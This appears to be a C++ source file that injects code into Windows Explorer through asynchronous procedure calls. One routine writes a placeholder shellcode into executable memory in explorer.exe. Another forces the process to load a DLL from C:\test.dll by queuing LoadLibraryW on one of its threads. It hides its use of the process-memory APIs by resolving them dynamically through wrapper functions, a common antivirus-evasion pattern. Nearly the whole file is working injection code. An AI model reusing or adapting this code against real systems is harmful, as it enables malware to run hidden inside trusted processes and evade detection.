﻿#include <iostream>
#include "safeApi.h"
#include "safeToolhelp.h"

typedef HANDLE (WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE (WINAPI* pOpenThread)(DWORD, BOOL, DWORD);
typedef DWORD (WINAPI* pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);

DWORD GetProcessIdByName(const wchar_t* processName) {
    if (!SafeCreateProcessSnapshot()) return 0;
    SAFE_PROCESSENTRY32 entry = {0};
    if (!SafeProcess32First(&entry)) return 0;
    do {
        if (_wcsicmp(entry.imageName, processName) == 0) {
            return entry.pid;
        }
    } while (SafeProcess32Next(&entry));
    return 0;
}

DWORD GetFirstThreadIdByPid(DWORD pid) {
    if (!SafeCreateThreadSnapshot()) return 0;
    SAFE_THREADENTRY32 entry = {0};
    if (SafeThread32First(&entry)) {
        do {
            if (entry.ownerPid == pid) {
                return entry.tid;
            }
        } while (SafeThread32Next(&entry));
    }
    return 0;
}

void ShellcodeInjection() {
    
    pOpenProcess MyOpenProcess = (pOpenProcess)SafeGetProcAddress(L"kernel32.dll", "OpenProcess");
    pVirtualAllocEx MyVirtualAllocEx = (pVirtualAllocEx)SafeGetProcAddress(L"kernel32.dll", "VirtualAllocEx");
    pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)SafeGetProcAddress(L"kernel32.dll", "WriteProcessMemory");
    pOpenThread MyOpenThread = (pOpenThread)SafeGetProcAddress(L"kernel32.dll", "OpenThread");
    pQueueUserAPC MyQueueUserAPC = (pQueueUserAPC)SafeGetProcAddress(L"kernel32.dll", "QueueUserAPC");

    if (!MyOpenProcess || !MyVirtualAllocEx || !MyWriteProcessMemory || !MyOpenThread || !MyQueueUserAPC) {
        std::cout << "动态API获取失败" << std::endl;
        return;
    }

    DWORD pid = GetProcessIdByName(L"explorer.exe");
    if (!pid) {
        std::cout << "未找到目标进程" << std::endl;
        return;
    }
    HANDLE hProcess = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cout << "打开进程失败" << std::endl;
        return;
    }
    char shellcode[] = {0x90, 0x90, 0xC3}; 
    LPVOID remoteAddr = MyVirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteAddr) {
        std::cout << "分配内存失败" << std::endl;
        CloseHandle(hProcess);
        return;
    }
    if (!MyWriteProcessMemory(hProcess, remoteAddr, shellcode, sizeof(shellcode), NULL)) {
        std::cout << "写入内存失败" << std::endl;
        CloseHandle(hProcess);
        return;
    }
    DWORD tid = GetFirstThreadIdByPid(pid);
    if (!tid) {
        std::cout << "未找到线程" << std::endl;
        CloseHandle(hProcess);
        return;
    }
    HANDLE hThread = MyOpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    if (!hThread) {
        std::cout << "打开线程失败" << std::endl;
        CloseHandle(hProcess);
        return;
    }
    MyQueueUserAPC((PAPCFUNC)remoteAddr, hThread, NULL);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    std::cout << "APC注入完成" << std::endl;
}

void DllInjection() {
    typedef HANDLE (WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
    typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    typedef HANDLE (WINAPI* pOpenThread)(DWORD, BOOL, DWORD);
    typedef DWORD (WINAPI* pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);

    pOpenProcess MyOpenProcess = (pOpenProcess)SafeGetProcAddress(L"kernel32.dll", "OpenProcess");
    pVirtualAllocEx MyVirtualAllocEx = (pVirtualAllocEx)SafeGetProcAddress(L"kernel32.dll", "VirtualAllocEx");
    pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)SafeGetProcAddress(L"kernel32.dll", "WriteProcessMemory");
    pOpenThread MyOpenThread = (pOpenThread)SafeGetProcAddress(L"kernel32.dll", "OpenThread");
    pQueueUserAPC MyQueueUserAPC = (pQueueUserAPC)SafeGetProcAddress(L"kernel32.dll", "QueueUserAPC");
    FARPROC MyLoadLibraryW = SafeGetProcAddress(L"kernel32.dll", "LoadLibraryW");

    if (!MyOpenProcess || !MyVirtualAllocEx || !MyWriteProcessMemory || !MyOpenThread || !MyQueueUserAPC || !MyLoadLibraryW) {
        std::cout << "动态API获取失败" << std::endl;
        return;
    }

    DWORD pid = GetProcessIdByName(L"explorer.exe");
    if (!pid) {
        std::cout << "未找到目标进程" << std::endl;
        return;
    }
    HANDLE hProcess = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cout << "打开进程失败" << std::endl;
        return;
    }
    wchar_t dllPath[] = L"C:\\test.dll";
    SIZE_T dllPathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    LPVOID remoteAddr = MyVirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteAddr) {
        std::cout << "分配内存失败" << std::endl;
        CloseHandle(hProcess);
        return;
    }
    if (!MyWriteProcessMemory(hProcess, remoteAddr, dllPath, dllPathSize, NULL)) {
        std::cout << "写入内存失败" << std::endl;
        CloseHandle(hProcess);
        return;
    }
    DWORD tid = GetFirstThreadIdByPid(pid);
    if (!tid) {
        std::cout << "未找到线程" << std::endl;
        CloseHandle(hProcess);
        return;
    }
    HANDLE hThread = MyOpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    if (!hThread) {
        std::cout << "打开线程失败" << std::endl;
        CloseHandle(hProcess);
        return;
    }
    MyQueueUserAPC((PAPCFUNC)MyLoadLibraryW, hThread, (ULONG_PTR)remoteAddr);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    std::cout << "DLL注入完成" << std::endl;
}

int main() {
    
    DllInjection(); 
    return 0;
}
